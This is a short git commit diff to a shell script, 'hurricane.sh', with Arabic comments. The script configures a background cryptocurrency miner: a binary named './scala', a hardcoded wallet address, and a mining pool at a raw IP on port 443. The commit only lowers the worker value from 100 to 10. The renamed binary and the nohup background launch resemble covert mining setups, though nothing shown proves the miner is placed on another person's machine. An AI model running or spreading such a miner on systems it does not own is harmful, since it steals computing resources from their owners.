d632f977b70472367f95cd19da20bc160c2df74a
ewilkinso <ewilkinson3@alaska.edu>
2025-08-12 11:39:07 +0100

    Update hurricane.sh

--- hurricane.sh
+++ hurricane.sh
@@ -3,7 +3,7 @@
 # اسم العملية
 APP_NAME="nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &"
 WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="100"
+WORKER="10"
 POOL="141.94.96.195:443"
 THREADS=
 
